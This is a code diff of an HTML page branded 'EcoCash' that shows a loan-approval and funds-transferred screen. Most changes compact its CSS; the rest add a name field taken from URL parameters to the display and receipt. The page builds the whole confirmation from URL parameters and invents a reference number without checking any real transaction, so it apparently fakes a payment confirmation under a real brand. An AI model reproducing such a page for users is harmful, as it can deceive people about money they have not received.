@@ -33,12 +33,7 @@
             flex-direction: column;
         }
 
-        header {
-            background: white;
-            padding: 14px 5%;
-            border-bottom: 3px solid var(--blue);
-        }
-
+        header { background: white; padding: 14px 5%; border-bottom: 3px solid var(--blue); }
         .logo { font-size: 22px; font-weight: 900; text-decoration: none; }
         .logo .eco { color: var(--blue); }
         .logo .cash { color: var(--red); }
@@ -46,29 +41,17 @@
         main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 36px 16px; }
 
         .card {
-            background: white;
-            border-radius: 18px;
-            padding: 36px 28px;
-            max-width: 420px;
-            width: 100%;
-            box-shadow: 0 16px 48px rgba(0,26,51,0.4);
-            text-align: center;
+            background: white; border-radius: 18px; padding: 36px 28px;
+            max-width: 420px; width: 100%; box-shadow: 0 16px 48px rgba(0,26,51,0.4); text-align: center;
         }
 
         .icon {
-            width: 80px;
-            height: 80px;
-            background: rgba(0,166,81,0.08);
-            border: 3px solid var(--green);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto 20px;
-            font-size: 36px;
+            width: 80px; height: 80px;
+            background: rgba(0,166,81,0.08); border: 3px solid var(--green); border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            margin: 0 auto 20px; font-size: 36px;
             animation: pop 0.5s ease-out, glow 2s ease-in-out infinite;
         }
-
         @keyframes pop { from { transform: scale(0.3); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         @keyframes glow { 0%,100% { box-shadow: 0 0 0 0 rgba(0,166,81,0.2); } 50% { box-shadow: 0 0 0 14px rgba(0,166,81,0); } }
 
@@ -77,70 +60,37 @@
 
         .details {
             background: linear-gradient(135deg, var(--blue), var(--blue-dark));
-            border-radius: 12px;
-            padding: 18px;
-            margin-bottom: 22px;
-            color: white;
-            text-align: left;
+            border-radius: 12px; padding: 18px; margin-bottom: 22px; color: white; text-align: left;
         }
-
         .d-row { display: flex; justify-content: space-between; align-items: center; font-size: 12px; margin-bottom: 8px; }
         .d-row:last-child { margin-bottom: 0; padding-top: 8px; border-top: 1px solid rgba(255,255,255,0.12); font-weight: 800; font-size: 14px; }
         .d-row .lbl { opacity: 0.7; }
         .d-row .val { font-weight: 700; }
 
         .btn-home {
-            width: 100%;
-            background: var(--blue);
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 50px;
-            font-weight: 800;
-            font-size: 13px;
-            text-transform: uppercase;
-            cursor: pointer;
-            font-family: inherit;
-            box-shadow: 0 4px 12px rgba(0,51,102,0.25);
-            transition: all 0.2s;
-            margin-bottom: 10px;
+            width: 100%; background: var(--blue); color: white; border: none; padding: 14px;
+            border-radius: 50px; font-weight: 800; font-size: 13px; text-transform: uppercase;
+            cursor: pointer; font-family: inherit; box-shadow: 0 4px 12px rgba(0,51,102,0.25);
+            transition: all 0.2s; margin-bottom: 10px;
         }
-
         .btn-home:hover { background: var(--blue-light); transform: translateY(-1px); }
 
         .btn-receipt {
-            width: 100%;
-            background: transparent;
-            color: var(--blue);
-            border: 2px solid var(--blue);
-            padding: 14px;
-            border-radius: 50px;
-            font-weight: 800;
-            font-size: 13px;
-            text-transform: uppercase;
-            cursor: pointer;
-            font-family: inherit;
-            transition: all 0.2s;
+            width: 100%; background: transparent; color: var(--blue); border: 2px solid var(--blue); padding: 14px;
+            border-radius: 50px; font-weight: 800; font-size: 13px; text-transform: uppercase;
+            cursor: pointer; font-family: inherit; transition: all 0.2s;
         }
-
         .btn-receipt:hover { background: var(--light); }
 
         .card-ft { margin-top: 18px; font-size: 11px; color: var(--muted); }
         .card-ft a { color: var(--blue-light); text-decoration: none; font-weight: 700; }
 
         .badges {
-            display: flex;
-            justify-content: center;
-            gap: 14px;
-            margin-top: 14px;
-            padding-top: 14px;
-            border-top: 1px solid var(--border);
-            font-size: 10px;
-            color: var(--muted);
-            font-weight: 600;
+            display: flex; justify-content: center; gap: 14px; margin-top: 14px;
+            padding-top: 14px; border-top: 1px solid var(--border);
+            font-size: 10px; color: var(--muted); font-weight: 600;
         }
 
-        /* Confetti */
         .confetti { position: fixed; inset: 0; pointer-events: none; z-index: 1000; overflow: hidden; }
         .c-piece { position: absolute; width: 8px; height: 8px; border-radius: 2px; animation: fall 3s ease-out forwards; opacity: 0; }
         @keyframes fall { 0% { transform: translateY(-60px) rotate(0deg); opacity: 1; } 100% { transform: translateY(100vh) rotate(720deg); opacity: 0; } }
@@ -163,7 +113,8 @@
             <p class="desc">Your loan has been successfully approved and funds have been transferred to your EcoCash account.</p>
 
             <div class="details" id="details">
-                <div class="d-row"><span class="lbl">Loan Amount</span><span class="val" id="sData">&mdash;</span></div>
+                <div class="d-row"><span class="lbl">Name</span><span class="val" id="sName">&mdash;</span></div>
+                <div class="d-row"><span class="lbl">Loan</span><span class="val" id="sData">&mdash;</span></div>
                 <div class="d-row"><span class="lbl">Phone</span><span class="val" id="sPhone">&mdash;</span></div>
                 <div class="d-row"><span class="lbl">Status</span><span class="val" style="color:#86efac;">Approved</span></div>
                 <div class="d-row"><span class="lbl">Reference</span><span class="val" id="sRef">&mdash;</span></div>
@@ -190,10 +141,11 @@
 
         function init() {
             var p = new URLSearchParams(location.search);
-            var d = p.get('data'), pr = p.get('price'), ph = p.get('phone');
+            var d = p.get('data'), pr = p.get('price'), ph = p.get('phone'), nm = p.get('name');
             var ref = 'ECO' + Date.now().toString().slice(-8);
-            bd = { data: d || 'N/A', price: pr || '0.00', phone: ph || 'N/A', ref: ref };
+            bd = { data: d || 'N/A', price: pr || '0.00', phone: ph || 'N/A', name: nm || 'N/A', ref: ref };
 
+            document.getElementById('sName').textContent = bd.name;
             document.getElementById('sData').textContent = bd.data;
             document.getElementById('sPhone').textContent = ph ? '+263' + ph : 'N/A';
             document.getElementById('sPrice').textContent = 'USD ' + bd.price;
@@ -208,6 +160,7 @@
                 'Reference: ' + bd.ref + '\n' +
                 'Date: ' + date + '\n' +
                 'Status: APPROVED\n\n' +
+                'Name: ' + bd.name + '\n' +
                 'Loan: ' + bd.data + '\n' +
                 'Phone: +263' + bd.phone + '\n' +
                 'Amount: USD ' + bd.price + '\n' +
